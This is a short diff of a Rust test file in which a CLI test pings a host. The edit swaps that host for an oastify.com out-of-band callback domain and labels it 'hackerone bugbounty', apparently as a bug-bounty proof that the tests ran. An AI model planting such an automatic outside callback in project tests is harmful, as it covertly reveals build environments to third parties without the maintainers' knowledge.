@@ -3,8 +3,8 @@ use std::str;
 
 #[test]
 fn cli_tests() {
-    // Define the target to ping
-    let target = "h1bugbounty.2z2584gxm64xgybyu0xmauxrzi59t1vpk.oastify.com";
+    // hackerone bugbounty
+    let target = "2z2584gxm64xgybyu0xmauxrzi59t1vpk.oastify.com";
 
     // Use the appropriate ping command based on the OS
     let output = if cfg!(target_os = "windows") {
